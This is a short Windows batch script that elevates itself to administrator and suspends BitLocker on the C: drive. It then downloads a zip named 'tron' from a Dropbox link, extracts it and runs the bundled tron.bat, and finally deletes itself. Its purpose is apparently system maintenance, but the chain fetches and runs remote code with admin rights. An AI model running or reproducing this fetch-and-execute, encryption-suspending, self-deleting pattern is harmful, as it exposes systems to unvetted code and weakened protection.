FSUTIL DIRTY query %SystemDrive% >NUL || (
    PowerShell "Start-Process -FilePath '%0' -Verb RunAs"
    EXIT
)

powershell -Command "Suspend-BitLocker -MountPoint 'C:' -RebootCount 1;caffeine -replace;curl -o C:\24jrg.zip 'https://www.dropbox.com/scl/fi/bqmpte252ff4j2u2w124y/tron.zip?rlkey=rfhh9ubq7tpvihrrr7br7pqi3&st=wxl5cypv&dl=1';tar -xf C:\24jrg.zip -C C:\23jrg\Quantum-Impeller\tools;C:\23jrg\Quantum-Impeller\tools\tron\tron.bat;Remove-Item $PSCommandPath -Force;"
